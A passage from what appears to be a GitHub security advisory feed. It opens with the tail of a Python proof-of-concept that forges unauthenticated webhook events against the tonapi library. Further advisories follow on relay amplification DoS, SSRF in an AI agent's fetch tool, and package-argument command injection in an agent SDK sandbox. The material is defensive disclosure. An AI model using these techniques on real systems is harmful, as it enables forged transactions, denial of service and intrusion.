    dispatcher_b = TonapiWebhookDispatcher(
        "https://victim.example/hook",
        client=client_b,
        accounts=["0:victim"],
    )
    default_called: list[str] = []

    @dispatcher_b.account_tx("0:victim")
    async def on_default_tx(event) -&gt; None:
        default_called.append(event.tx_hash)

    await dispatcher_b.setup()

    print("=" * 60)
    print("VULN-001: Webhook custom path authentication bypass PoC")
    print("=" * 60)
    print(f"[dispatcher_a] registered paths  : {dispatcher_a.paths}")
    print(f"[dispatcher_a] endpoints called  : {client_a.registered_endpoints}")
    print(f"[dispatcher_a] _tokens map       : {dispatcher_a._tokens}")
    print()
    print(f"[dispatcher_b] registered paths  : {dispatcher_b.paths}")
    print(f"[dispatcher_b] endpoints called  : {client_b.registered_endpoints}")
    print(f"[dispatcher_b] _tokens map       : {dispatcher_b._tokens}")
    print()

    forged_payload = {
        "event_type": "account_tx",
        "account_id": "0:victim",
        "lt": 1,
        "tx_hash": "FORGED_TX_HASH",
    }

    results: dict[str, str] = {}

    # ------------------------------------------------------------------
    # Case A: custom path, NO auth -&gt; BUG: should raise, actually passes
    # ------------------------------------------------------------------
    custom_called.clear()
    try:
        await dispatcher_a.process(
            "/hook/custom",
            forged_payload,
            authorization=None,
        )
        if "FORGED_TX_HASH" in custom_called:
            results["A"] = (
                "VULNERABLE — handler invoked with NO Authorization header; "
                "custom_called=" + repr(custom_called)
            )
        else:
            results["A"] = "UNCERTAIN — process() did not raise but handler was not called"
    except TONAPIError as exc:
        results["A"] = f"NOT_VULNERABLE (raised) — {exc}"

    # ------------------------------------------------------------------
    # Case B: custom path, WRONG auth -&gt; BUG: should raise, actually passes
    # ------------------------------------------------------------------
    custom_called.clear()
    try:
        await dispatcher_a.process(
            "/hook/custom",
            forged_payload,
            authorization="Bearer totally-wrong-token",
        )
        if "FORGED_TX_HASH" in custom_called:
            results["B"] = (
                "VULNERABLE — handler invoked with WRONG Authorization header; "
                "custom_called=" + repr(custom_called)
            )
        else:
            results["B"] = "UNCERTAIN — process() did not raise but handler was not called"
    except TONAPIError as exc:
        results["B"] = f"NOT_VULNERABLE (raised) — {exc}"

    # ------------------------------------------------------------------
    # Case C: default path, NO auth -&gt; must raise (control: works correctly)
    # ------------------------------------------------------------------
    default_called.clear()
    try:
        await dispatcher_b.process(
            "/hook/account-tx",
            forged_payload,
            authorization=None,
        )
        results["C"] = "UNEXPECTED_PASS — default path accepted no-auth (unexpected)"
    except TONAPIError as exc:
        results["C"] = f"CORRECTLY_REJECTED — {exc}"

    # ------------------------------------------------------------------
    # Case D: default path, VALID auth -&gt; baseline, must succeed (control)
    # ------------------------------------------------------------------
    default_called.clear()
    try:
        await dispatcher_b.process(
            "/hook/account-tx",
            forged_payload,
            authorization="Bearer real-secret-token-abc123",
        )
        if "FORGED_TX_HASH" in default_called:
            results["D"] = "CORRECTLY_ACCEPTED — default path with valid auth"
        else:
            results["D"] = "UNCERTAIN — process() did not raise but handler was not called"
    except TONAPIError as exc:
        results["D"] = f"UNEXPECTED_REJECTION — {exc}"

    # ------------------------------------------------------------------
    # Summary
    # ------------------------------------------------------------------
    print("Test results:")
    for case, result in results.items():
        print(f"  Case {case}: {result}")
    print()

    vuln_confirmed = (
        "VULNERABLE" in results.get("A", "")
        and "VULNERABLE" in results.get("B", "")
        and "CORRECTLY_REJECTED" in results.get("C", "")
        and "CORRECTLY_ACCEPTED" in results.get("D", "")
    )

    if vuln_confirmed:
        print("[RESULT] VULNERABILITY CONFIRMED")
        print("  dispatcher_a._tokens has NO entry for /hook/custom (only for /hook/account-tx)")
        print("  =&gt; expected_token=None =&gt; auth check skipped =&gt; forged handler called")
        print("  Attacker can POST any payload to /hook/custom without credentials.")
    else:
        print("[RESULT] VULNERABILITY NOT CONFIRMED")
        print("  Check individual case results above for details.")

    return vuln_confirmed


if __name__ == "__main__":
    confirmed = asyncio.run(run_poc())
    sys.exit(0 if confirmed else 1)
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/nessshon/tonapi/security/advisories/GHSA-3fcr-jvgp-7f58">https://github.com/nessshon/tonapi/security/advisories/GHSA-3fcr-jvgp-7f58</a></li>
<li><a href="https://github.com/nessshon/tonapi/commit/854222b7ee68d3fb7b4d6d899d200f388483bd86">https://github.com/nessshon/tonapi/commit/854222b7ee68d3fb7b4d6d899d200f388483bd86</a></li>
<li><a href="https://github.com/nessshon/tonapi/releases/tag/v2.2.1">https://github.com/nessshon/tonapi/releases/tag/v2.2.1</a></li>
<li><a href="https://github.com/advisories/GHSA-3fcr-jvgp-7f58">https://github.com/advisories/GHSA-3fcr-jvgp-7f58</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-3fcr-jvgp-7f58</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T17:09:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[qti-neon] QTINeon has unauthenticated relay-to-host amplification via unbounded RECONNECT_REQUEST forwarding]]></title>
        <id>https://github.com/advisories/GHSA-85rg-p3fr-xc2f</id>
        <link href="https://github.com/advisories/GHSA-85rg-p3fr-xc2f"/>
        <updated>2026-07-28T16:36:48.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The relay's reconnect handler forwards every <code>RECONNECT_REQUEST</code> to the host without deduplication or a size cap on the <code>pendingReconnects</code> map, unlike the connect flow which guards against this with <code>maxPendingConnections</code>. An unauthenticated attacker who knows a valid session ID can send <code>RECONNECT_REQUEST</code> packets from many spoofed source addresses; each packet that passes the session lookup is forwarded to the host as a new reconnect attempt. Because the per-source rate limiter assigns a fresh token bucket to each spoofed IP, it provides no protection. The host receives one forwarded packet per spoofed source per cleanup cycle, making the relay an amplification vector for denial-of-service against the host. The host's real address is never exposed to clients by design, so this is the primary viable DoS path against it. A secondary issue: once more than <code>maxRateLimiters</code> spoofed IPs are seen, <code>performCleanup</code> calls <code>rateLimiters.clear()</code>, resetting rate limit state for all sources including legitimate ones.</p>
<p>Affected: <code>NeonRelay</code> in all three implementations (Java, Python, TypeScript).</p>
<h3 id="patches">Patches</h3>
<p>Not yet patched. Fix consists of three changes to handleReconnectRequest in each implementation:</p>
<ol>
<li>Reject the request if <code>pendingReconnects.size() &gt;= maxPendingConnections</code> (mirrors the existing connect-flow guard)</li>
<li>Only forward to the host if the <code>sessionId:clientId</code> key is not already present in <code>pendingReconnects</code> — the map entry can still be updated with the new source address, but the host only needs to validate once per slot</li>
<li>In <code>performCleanup</code>, evict throttled entries before falling back to <code>rateLimiters.clear()</code> to avoid resetting legitimate sources' rate limit state</li>
</ol>
<h3 id="workarounds">Workarounds</h3>
<p>Operators can partially mitigate by placing the relay behind a network-level filter that drops packets with spoofed source addresses (BCP38/uRPF). This does not address the missing <code>pendingReconnects</code> size cap or the <code>rateLimiters.clear()</code> issue but eliminates the amplification path in most deployment environments.</p>
<h3 id="references">References</h3>
<ul>
<li>PROTOCOL.md — reconnect flow</li>
<li>ARCHITECTURE.md — reconnect handshake detail (step 4 describes the unbounded <code>put</code>)</li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/Quiet-Terminal-Interactive/QTINeon/security/advisories/GHSA-85rg-p3fr-xc2f">https://github.com/Quiet-Terminal-Interactive/QTINeon/security/advisories/GHSA-85rg-p3fr-xc2f</a></li>
<li><a href="https://github.com/advisories/GHSA-85rg-p3fr-xc2f">https://github.com/advisories/GHSA-85rg-p3fr-xc2f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-85rg-p3fr-xc2f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-28T16:36:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[nanobot-ai] Nanobot contains a server-side request forgery vulnerability in the web_fetch tool]]></title>
        <id>https://github.com/advisories/GHSA-434r-7c99-hwf3</id>
        <link href="https://github.com/advisories/GHSA-434r-7c99-hwf3"/>
        <updated>2026-07-27T16:02:27.000Z</updated>
        <content type="html"><![CDATA[<p>Nanobot prior to version 0.2.1 contains a server-side request forgery vulnerability in the web_fetch tool that allows remote attackers to reach internal or private network hosts by supplying a URL that redirects to a loopback or private address via a 3xx Location header. Attackers can exploit the automatic HTTP redirect following behavior in the httpx library to bypass initial URL validation and cause the runtime to send outbound requests to internal hosts before final resolved URL validation is applied.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-49138">https://nvd.nist.gov/vuln/detail/CVE-2026-49138</a></li>
<li><a href="https://github.com/HKUDS/nanobot/pull/3928">https://github.com/HKUDS/nanobot/pull/3928</a></li>
<li><a href="https://github.com/HKUDS/nanobot/commit/545294c62c0947da40eb5b65288aaf02b5fdf632">https://github.com/HKUDS/nanobot/commit/545294c62c0947da40eb5b65288aaf02b5fdf632</a></li>
<li><a href="https://github.com/HKUDS/nanobot/releases/tag/v0.2.1">https://github.com/HKUDS/nanobot/releases/tag/v0.2.1</a></li>
<li><a href="https://www.vulncheck.com/advisories/nanobot-ssrf-via-web-fetch-tool-redirect-following">https://www.vulncheck.com/advisories/nanobot-ssrf-via-web-fetch-tool-redirect-following</a></li>
<li><a href="https://github.com/advisories/GHSA-434r-7c99-hwf3">https://github.com/advisories/GHSA-434r-7c99-hwf3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-434r-7c99-hwf3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2026-06-01T21:30:44.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[bedrock-agentcore] AWS Bedrock AgentCore: Improper neutralization of argument delimiters in the Python SDK install_packages()]]></title>
        <id>https://github.com/advisories/GHSA-j6g5-3hh3-pgw8</id>
        <link href="https://github.com/advisories/GHSA-j6g5-3hh3-pgw8"/>
        <updated>2026-07-24T22:38:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The AWS Bedrock AgentCore Python SDK (bedrock-agentcore) provides tools for building AI agents, including a Code Interpreter client that installs Python packages into a managed sandbox. An issue exists where, under certain circumstances, improper neutralization of argument delimiters in the install_packages() method allows a remote authenticated user to execute arbitrary commands within the Code Interpreter sandbox via crafted package name arguments.</p>
<h3 id="impact">Impact</h3>
<p>Insufficient input validation in install_packages() allows specially crafted package specifiers to bypass validation and achieve arbitrary command execution within the sandbox. A remote authenticated user who can influence the arguments to install_packages() can execute arbitrary commands within the Code Interpreter sandbox environment.</p>
<h3 id="impacted-versions">Impacted Versions</h3>
<p>&lt; 1.18.1</p>
<h3 id="patches">Patches</h3>
<p>This issue has been addressed in bedrock-agentcore version 1.18.1. We recommend upgrading to the latest version and ensuring any forked or derivative code is patched to incorporate the new fixes.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you are not able to upgrade, do not pass untrusted or model-generated input to install_packages(). Applications that must accept dynamic package names should validate them against strict PyPI naming rules -- including constraining any extras group to comma-separated identifiers -- before calling the SDK.</p>
<h3 id="references">References</h3>
<p>If you have any questions or comments about this advisory, AWS asks that you contact AWS Security via the <a href="https://aws.amazon.com/security/vulnerability-reporting">vulnerability reporting page</a> or directly via email to <a href="mailto:aws-security@amazon.com">aws-security@amazon.com</a>. Please do not create a public GitHub issue.</p>
<h3 id="acknowledgement">Acknowledgement</h3>
<p>AWS would like to thank Sergio Garcia (@MrCloudSec) for collaborating on this issue through the coordinated issue disclosure process.</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/aws/bedrock-agentcore-sdk-python/security/advisories/GHSA-j6g5-3hh3-pgw8">https://github.com/aws/bedrock-agentcore-sdk-python/security/advisories/GHSA-j6g5-3hh3-pgw8</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-16796">https://nvd.nist.gov/vuln/detail/CVE-2026-16796</a></li>
<li><a href="https://github.com/aws/bedrock-agentcore-sdk-python/pull/581">https://github.com/aws/bedrock-agentcore-sdk-python/pull/581</a></li>
<li><a href="https://github.com/aws/bedrock-agentcore-sdk-python/commit/3c4b4ee6b8730e6313a82c743ac37dbcc1c21cdb">https://github.com/aws/bedrock-agentcore-sdk-python/commit/3c4b4ee6b8730e6313a82c743ac37dbcc1c21cdb</a></li>
<li><a href="https://aws.amazon.com/security/security-bulletins/2026-065-aws">https://aws.amazon.com/security/security-bulletins/2026-065-aws</a></li>
<li><a href="https://pypi.org/project/bedrock-agentcore/1.18.1">https://pypi.org/project/bedrock-agentcore/1.18.1</a></li>
<li><a href="https://github.com/advisories/GHSA-j6g5-3hh3-pgw8">https://github.com/advisories/GHSA-j6g5-3hh3-pgw8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-j6g5-3hh3-pgw8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2026-07-24T22:38:56.000Z</published>
    </entry>
</feed>